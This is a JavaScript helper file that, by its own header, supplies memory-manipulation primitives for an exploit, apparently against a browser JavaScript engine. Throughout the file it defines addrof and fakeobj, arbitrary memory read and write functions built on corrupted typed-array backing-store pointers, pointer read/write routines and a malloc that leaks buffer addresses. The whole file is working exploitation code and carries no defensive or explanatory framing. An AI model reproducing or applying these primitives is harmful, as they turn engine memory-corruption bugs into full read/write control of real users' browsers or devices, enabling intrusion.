// helpers.js
// Utility functions for memory manipulation primitives used by the exploit.

/**
 * Writes a 48-bit integer (low 32 bits and high 16 bits) into a Uint32Array at indices 4 and 5.
 * This is used to set the backing store pointer of typed arrays.
 * 
 * @param {number} x - The 48-bit integer address to write.
 * @param {Uint32Array} a - The Uint32Array where the address will be written.
 */
function i48_put(x, a) {
    a[4] = x | 0;           // lower 32 bits
    a[5] = (x / 4294967296) | 0; // upper 16 bits (assuming 48-bit address)
}

/**
 * Reads a 48-bit integer from indices 4 and 5 of a Uint32Array.
 * Used to retrieve backing store pointers.
 * 
 * @param {Uint32Array} a - The Uint32Array to read from.
 * @returns {number} The reconstructed 48-bit integer.
 */
function i48_get(a) {
    return a[4] + a[5] * 4294967296;
}

/**
 * Obtains the memory address of a JavaScript object.
 * 
 * @param {Object} x - The object to get the address of.
 * @returns {number} The memory address of the object.
 */
function addrof(x) {
    leaker_obj.a = x;       // Store object in leaker_obj.a
    return i48_get(leaker_arr); // Read address from leaker_arr backing store
}

/**
 * Creates a fake JavaScript object at a specified memory address.
 * 
 * @param {number} x - The memory address to fake an object at.
 * @returns {Object} The fake object.
 */
function fakeobj(x) {
    i48_put(x, leaker_arr); // Write address to leaker_arr backing store
    return leaker_obj.a;    // Return object at that address
}

/**
 * Prepares the arbitrary read primitive by setting the backing store pointer and size.
 * 
 * @param {number} p - The memory address to read from.
 * @param {number} sz - The number of bytes to read.
 */
function read_mem_setup(p, sz) {
    i48_put(p, oob_master); // Set backing store pointer of oob_slave
    oob_master[6] = sz;     // Set length for oob_slave
}

/**
 * Reads 'sz' bytes from memory address 'p' and returns as an array.
 * 
 * @param {number} p - The memory address to read from.
 * @param {number} sz - Number of bytes to read.
 * @returns {Array} Array of bytes read.
 */
function read_mem(p, sz) {
    read_mem_setup(p, sz);
    var arr = [];
    for (var i = 0; i < sz; i++)
        arr.push(oob_slave[i]);
    return arr;
}

/**
 * Reads 'sz' bytes from memory address 'p' and returns as a string.
 * 
 * @param {number} p - Memory address.
 * @param {number} sz - Number of bytes.
 * @returns {string} String representation of bytes.
 */
function read_mem_s(p, sz) {
    read_mem_setup(p, sz);
    return "" + oob_slave;
}

/**
 * Reads 'sz' bytes from memory address 'p' and returns as a Uint8Array.
 * 
 * @param {number} p - Memory address.
 * @param {number} sz - Number of bytes.
 * @returns {Uint8Array} Array of bytes.
 */
function read_mem_b(p, sz) {
    read_mem_setup(p, sz);
    var b = new Uint8Array(sz);
    b.set(oob_slave);
    return b;
}

/**
 * Reads memory as a string from address 'p' with length 'sz'.
 * Converts each byte to a character.
 * 
 * @param {number} p - Memory address.
 * @param {number} sz - Number of bytes.
 * @returns {string} String read from memory.
 */
function read_mem_as_string(p, sz) {
    var x = read_mem_b(p, sz);
    var ans = '';
    for (var i = 0; i < x.length; i++)
        ans += String.fromCharCode(x[i]);
    return ans;
}

/**
 * Writes an array of bytes to memory address 'p'.
 * 
 * @param {number} p - Memory address to write to.
 * @param {Array} data - Array of byte values to write.
 */
function write_mem(p, data) {
    i48_put(p, oob_master); // Set backing store pointer
    oob_master[6] = data.length; // Set length
    for (var i = 0; i < data.length; i++)
        oob_slave[i] = data[i];  // Write each byte
}

/**
 * Reads a 64-bit pointer value from memory address 'p'.
 * Returns as a JavaScript number (may lose precision for very large addresses).
 * 
 * @param {number} p - Memory address to read pointer from.
 * @returns {number} Pointer value read.
 */
function read_ptr_at(p) {
    var ans = 0;
    var d = read_mem(p, 8); // Read 8 bytes
    for (var i = 7; i >= 0; i--)
        ans = 256 * ans + d[i];
    return ans;
}

/**
 * Writes a 64-bit pointer value 'd' to memory address 'p'.
 * 
 * @param {number} p - Memory address to write pointer to.
 * @param {number} d - Pointer value to write.
 */
function write_ptr_at(p, d) {
    var arr = [];
    for (var i = 0; i < 8; i++) {
        arr.push(d & 0xff);
        d /= 256;
    }
    write_mem(p, arr);
}

/**
 * Converts a number to a hexadecimal string.
 * 
 * @param {number} x - Number to convert.
 * @returns {string} Hexadecimal string.
 */
function hex(x) {
    return (new Number(x)).toString(16);
}

// Array to hold allocated Uint8Arrays to prevent garbage collection
var malloc_nogc = [];

/**
 * Allocates a Uint8Array of size 'sz' and returns its backing store address.
 * Keeps a reference in malloc_nogc to prevent GC.
 * 
 * @param {number} sz - Size in bytes to allocate.
 * @returns {number} Address of the allocated buffer's backing store.
 */
function malloc(sz) {
    var arr = new Uint8Array(sz);
    malloc_nogc.push(arr);
    return read_ptr_at(addrof(arr) + 0x10);
}
